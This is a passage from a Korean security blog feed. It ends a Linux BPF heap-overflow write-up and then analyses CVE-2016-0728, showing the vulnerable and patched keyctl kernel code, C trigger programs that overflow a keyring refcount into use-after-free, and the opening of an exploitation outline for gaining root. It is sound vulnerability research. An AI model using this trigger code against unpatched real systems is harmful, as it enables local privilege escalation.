class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/100gx 0xffff88807f510300</span><br><span class="line">0xffff88807f510300:0xffff88807f5105000x0000000000000000     // fd = 3</span><br><span class="line">0xffff88807f510310:0x00000000000000000x0000000000000017</span><br><span class="line">0xffff88807f510320:0xffffffff000000400x0000000100000000</span><br><span class="line">0xffff88807f510330:0xffffffff000000000x0000000000000000</span><br><span class="line">0xffff88807f510340:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f510350:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f510360:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f510370:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f510380:0xffff88807fad8b000x0000000000000000</span><br><span class="line">0xffff88807f510390:0x00000000000000000xffff88807f510398</span><br><span class="line">0xffff88807f5103a0:0xffff88807f5103980xffffffff8119ac50</span><br><span class="line">0xffff88807f5103b0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f5103c0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f5103d0:0x00000000000000010x0000000000000002</span><br><span class="line">0xffff88807f5103e0:0x00000000000000030x0000000000000004</span><br><span class="line">0xffff88807f5103f0:0x00000000000000050x0000000000000006</span><br><span class="line">0xffff88807f510400:0x000000a0000000000x0000000000000008     // fd = 7</span><br><span class="line">0xffff88807f510410:0xffff888079b06f680x0000000000000017</span><br><span class="line">0xffff88807f510420:0xffffffff000000400x0000000100000000</span><br><span class="line">0xffff88807f510430:0xffffffff000000140x0000000000000000</span><br><span class="line">0xffff88807f510440:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f510450:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f510460:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807f510470:0x00000000000000000x0000000000000000</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>heap overflow가 일어난 후의 데이터 상황입니다. fd 7 맵의 첫 번째 멤버가 <code>fakestack</code> 주소인 <code>0x000000a000000000</code> 으로 덮인 것을 확인할 수 있습니다.</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul><li><a href="https://www.mail-archive.com/netdev@vger.kernel.org/msg256054.html" target="_blank" rel="noopener">https://www.mail-archive.com/netdev@vger.kernel.org/msg256054.html</a></li><li><a href="https://github.com/ww9210/kernel4.20_bpf_LPE/blob/master/exp.c" target="_blank" rel="noopener">https://github.com/ww9210/kernel4.20_bpf_LPE/blob/master/exp.c</a></li><li><a href="http://p4nda.top/2019/01/02/kernel-bpf-overflow/" target="_blank" rel="noopener">http://p4nda.top/2019/01/02/kernel-bpf-overflow/</a></li><li><a href="https://github.com/wariua/manpages-ko/wiki/bpf(2" target="_blank" rel="noopener">https://github.com/wariua/manpages-ko/wiki/bpf(2</a>)</li><li><a href="https://wariua.github.io/facility/extended-bpf.html" target="_blank" rel="noopener">https://wariua.github.io/facility/extended-bpf.html</a></li><li><a href="https://ssup2.github.io/theory_analysis/Linux_BPF/" target="_blank" rel="noopener">https://ssup2.github.io/theory_analysis/Linux_BPF/</a></li><li><a href="http://jake.dothome.co.kr/kmalloc/" target="_blank" rel="noopener">http://jake.dothome.co.kr/kmalloc/</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/12/03/Pwn/%E3%84%B4%20Research/linux-kenel-bpf/#disqus_thread</comments>
    </item>
    
    <item>
      <title>CVE-2016-0728 (Kernel One-day Analysis)</title>
      <link>https://defenit.kr/2019/11/12/Pwn/%E3%84%B4%20Research/CVE_2016_0728/</link>
      <guid>https://defenit.kr/2019/11/12/Pwn/%E3%84%B4%20Research/CVE_2016_0728/</guid>
      <pubDate>Mon, 11 Nov 2019 23:37:27 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;Contents&quot;&gt;&lt;a href=&quot;#Contents&quot; class=&quot;headerlink&quot; title=&quot;Contents&quot;&gt;&lt;/a&gt;Contents&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Information&lt;/strong&gt;&lt;/p&gt;
&lt;/li
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="Contents"><a href="#Contents" class="headerlink" title="Contents"></a>Contents</h2><ul><li><p><strong>Information</strong></p></li><li><p><strong>Vulnerability</strong></p></li><li><strong>PoC</strong></li></ul><h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a><strong>Information</strong></h2><p>2016년, <strong>Perception Point</strong>팀이 <code>Linux kernel</code>에서의 <code>LPE</code>취약점을 발견했다.</p><p>이 취약점은 2012년부터 존재했지만 2016년 근래에서야 취약점을 발견하였다.</p><p>천만대의 <code>Linux</code> 개인 PC와 <code>66%</code>의 <code>Android device</code>에 영향을 준다.</p><p>이 취약점의 <code>PoC</code>가 성공적으로 실행되면 <code>root</code>권한을 획득할 수 있다.</p><p>취약점은 <code>32bit</code>,<code>64bit</code>상관없이 발생하며, <code>3.8</code>버전 이상의 모든 리눅스 커널에서 발생한다.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>크게 두가지 취약점이 발생한다.</p><ul><li><strong>Integer Overflow</strong></li><li><strong>Use - After - Free</strong></li></ul><p><strong>Integer Overflow</strong> 취약점이 존재하는 부분은 <code>keyctl</code>이라는 커맨드이다.</p><p>요약하자면, <code>keyctl</code>은 리눅스의 키(key)를 보유 및 관리하는 시스템이다.</p><p><code>keyctl(KEYCTL_JOIN_SESSION_KEYRING, 명칭)</code>을 이용하여 현재의 세션에서 새로운 <code>keyring</code>을 생성할 수 있다.</p><p>그 후, 해당 <code>keyring</code>에 이름을 지정할 수 있다. </p><p><code>keyring</code>은 같은 이름의 <code>keyring</code>을 참조하여 서로 다른 프로세스에서 공유를 할 수 있다.</p><p>만약 하나의 <code>keyring</code>이 여러 프로세스에서 공유되고 있다면 <code>usage</code>라는 필드에 위치한 객체의 내부 레퍼런스 카운트가 계속해서 증가하게 된다.</p><p>일단 코드를 분석해보자.</p><p>아래 코드는 취약점이 패치되지 않은 코드이다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line"><span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = prepare_creds();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">old = current_cred();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* if no name is provided, install an anonymous keyring */</span></span><br><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = serial;</span><br><span class="line"><span class="keyword">goto</span> okay;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* allow the user to join or create a named keyring */</span></span><br><span class="line">mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* look for an existing keyring of this name */</span></span><br><span class="line">keyring = find_keyring_by_name(name, <span class="literal">false</span>); <span class="comment">// find_keyring_by_name increments keyring usage if a keyring was found</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line"><span class="comment">/* not found - try and create a new one */</span></span><br><span class="line">keyring = keyring_alloc(</span><br><span class="line">name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2; <span class="comment">// The bug is here, skips key_put.</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* we've got a keyring - now to install it */</span></span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">commit_creds(<span class="keyword">new</span>);</span><br><span class="line">mutex_unlock(&amp;key_session_mutex); <span class="comment">// 뮤텍스를 해제한다. (동기화 해제)</span></span><br><span class="line"></span><br><span class="line">ret = keyring-&gt;serial; <span class="comment">// 생성된 새로운 serial을 리턴값에 넣는다.</span></span><br><span class="line">key_put(keyring); <span class="comment">// keyring에 대한 레퍼런스 카운터를 증가시킨다.</span></span><br><span class="line">okay:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>else if (IS_ERR(keyring))</code>  : 만일 존재하기는 하는데 해당 <code>keyring</code>이 정상적이지 않은 데이터일 경우 에러를 리턴한다. </p><p><code>else if (keyring == new-&gt;session_keyring)</code> :  key가 존재하지만 <code>keyring</code>이 새로운 <code>session_keyring</code>과 같다면 <code>error2</code>로 점프한다.</p><p><code>mutex_unlock(&amp;key_session_mutex);</code> : <code>mutex</code>를 해제한다.</p><p>전체적인 흐름은 크게 두가지이다.</p><ol><li><code>join_session_keyring</code>함수가 호출되면 현재 검색하는 <code>key</code>가 리스트에 있는지 찾는다.</li><li>존재 한다면 평범하게 종료, 존재하지 않으면 새로 할당을 수행 한다.</li></ol><blockquote><p>코드 내의 <code>session_keyring</code>은 <code>cred struct</code>에 정의되어있다.</p><p><code>struct key __rcu *session_keyring; /* keyring inherited over fork */</code></p><p>새로 세션을 생성하고 난 후에 상속받은 <code>keyring</code>을 의미하는 듯 하다.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">key_serial_t</span> serial;</span><br><span class="line"></span><br><span class="line">        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">"TestSession"</span>);</span><br><span class="line">        keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL);</span><br><span class="line"></span><br><span class="line">        keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">"TestSession"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 위의 코드에서 <code>keyctl(KEYCTL_JOIN_SESSION_KEYRING, &quot;TestSession&quot;);</code>로 <code>keyring</code>을 만들면 일단 <code>find_keyring_by_name</code>을 통하여 <code>keyring</code>을 검사한다.</p><p>그리고 우리가 원하는 대로 <code>join_session_keyring</code>으로 진입한다.</p><p>이렇게 코드가 종료되면 위에서 설명했듯이 <code>keyring</code>에 대한 <code>reference count</code>가 계속해서 증가한다.</p><p><code>keyring</code>의 정보는 <code>/proc/keys</code>에 저장되어있으므로, <code>/proc/keys</code>를 확인해보자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">key_serial_t</span> serial;</span><br><span class="line"></span><br><span class="line">        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">"TestSession"</span>);</span><br><span class="line">        keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL);</span><br><span class="line"></span><br><span class="line">        keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">"TestSession"</span>);</span><br><span class="line">        system(<span class="string">"cat /proc/keys"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./key_test</span><br><span class="line">0b824895 I--Q---     8 perm 3f3f0000  1000  1000 keyring   TestSession: empty</span><br><span class="line">$ ./key_test</span><br><span class="line">0b824895 I--Q---     9 perm 3f3f0000  1000  1000 keyring   TestSession: empty</span><br><span class="line">$ ./key_test</span><br><span class="line">0b824895 I--Q---    10 perm 3f3f0000  1000  1000 keyring   TestSession: empty</span><br></pre></td></tr></table></figure><p>프로세스를 계속 참조하면서 계속해서 <code>keyring</code>이 증가하는 것을 볼 수 있다.</p><p>이렇게 <code>keyring</code>이 계속해서 증가하는 과정에서 <strong>Integer overflow</strong>가 발생한다.</p><p><code>reference count</code>를 관리하는 구조체는 아래와 같다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> counter; </span><br><span class="line">    :</span><br><span class="line">    :</span><br><span class="line">&#125; <span class="keyword">atomic_t</span>;</span><br></pre></td></tr></table></figure><p><code>atomic_t</code>은 사실상 <code>int</code>타입이다.</p><p>즉, 우리가 <code>0xffffffff</code>번 만큼 실행을 시킨다면, 오버플로우를 통하여 0으로 초기화 시킬 수 있다.</p><blockquote><p>0 x ff ff ff ff ( 2^32 )</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">key_serial_t</span> serial;</span><br><span class="line"></span><br><span class="line">        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">"TestSession"</span>);</span><br><span class="line">        keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xffffffff</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">"TestSession"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">"cat /proc/keys"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./key_test</span><br><span class="line">0e9553ee I--Q---     4 perm 3f3f0000  1000  1000 keyring   TestSession: empty</span><br><span class="line"></span><br><span class="line">$ cat /proc/keys</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p><code>0xffffffff</code>번 실행시킨 결과이다.</p><p><code>cat /proc/keys</code>를 실행시켜도 아무런 결과가 나오지 않는다.</p><p>왜냐하면 <code>reference count</code>가 <code>0</code>이 된 것을 확인한 <code>Garbage Collector</code>가 0번 <code>keyring</code>을 <code>free</code>시켜주었기 때문이다.</p><p>사실 우리는 이렇게 <code>free</code>된것이 진짜로 <code>free</code>된게 아니라는걸 알고있다.</p><p>왜냐하면 오버플로우로 인하여 <code>free</code>되었기 때문이다.</p><p>하지만, <code>Linux kernel</code>은 이를 <code>free</code>된 메모리로 생각한다. </p><p>즉, 이렇게 해제된 메모리에 재할당을 하므로써 <code>UAF</code>취약점을 트리거할 수 있다.</p><p>아래는 취약점이 패치된 코드이다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line"><span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = prepare_creds();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">old = current_cred();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* if no name is provided, install an anonymous keyring */</span></span><br><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = serial;</span><br><span class="line"><span class="keyword">goto</span> okay;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* allow the user to join or create a named keyring */</span></span><br><span class="line">mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* look for an existing keyring of this name */</span></span><br><span class="line">keyring = find_keyring_by_name(name, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line"><span class="comment">/* not found - try and create a new one */</span></span><br><span class="line">keyring = keyring_alloc(</span><br><span class="line">name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">ret = PTR_ERR(keyring);</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">key_put(keyring);</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* we've got a keyring - now to install it */</span></span><br><span class="line">ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">commit_creds(<span class="keyword">new</span>);</span><br><span class="line">mutex_unlock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line">ret = keyring-&gt;serial;</span><br><span class="line">key_put(keyring);</span><br><span class="line">okay:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>주목해야할 부분은 아래부분이다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">key_put(keyring);</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>goto error2</code>로 가기 전에 <code>key_put(keyring)</code>으로 레퍼런스를 감소시킨다.</p><p>즉, <code>Integer overflow</code>를 방지해준다.</p><p>여기까지 <code>Integer overflow</code>와 <code>Using-After-Free</code>취약점이 어떤식으로 트리거되는지 알아보고, 코드에 어떠한 오류가 있는지 알아보았다.</p><p>이제 <code>PoC Exploit</code>을 보자.</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>일단 취약점을 트리거하는 방법은 아래와 같다.</p><ol><li><code>key</code> 오브젝트를 만든다.</li><li>해당 <code>keyring</code>오브젝트의 <code>usage</code>에 <code>Interger overflow</code>를 발생시킨다.</li><li>해당 오브젝트가 <code>free</code>된다.</li><li><code>user space</code>에서 이미 <code>free</code>된 <code>keyring</code>오브젝트가 사용한 공간에서 새로운 커널 오브젝트를 할당한다. 이때 할당한 오브젝트는 사용자가 컨트롤 가능한 내용이다.</li><li>이전의 <code>keyring</code> 오브젝트를 참조하게 하여 코드를 실행시킨다.</li></ol><p>1번부터 3번까지는 위에서 설명했고, 여기서는 추가적으로 커널에서 사용자가 원하는 코드를 어떤식으로 실행시킬 수 있는지 알아보겠다.</p><p>일단 <code>UAF</code>를 트리거하려면 재할당을 해야한다.</p><p>일단 현재 프로세스가 <code>free</code>된 <code>keyring</code>을 가르키고 있을것이다.</p><p>이제 커널 오브젝트를 할당해서 <code>free</code>된 <code>keyring</code>오브젝트를 덮어쓸 일만 남았다.</p><p>우리는 <code>msgget</code>함수와 <code>IPC</code>시스템을 활용하여 전송할 데이터의 길이를 설정하고, 커널에 값을 전달하여 메모리를 할당한다.</p><p>전송 데이터의 길이는 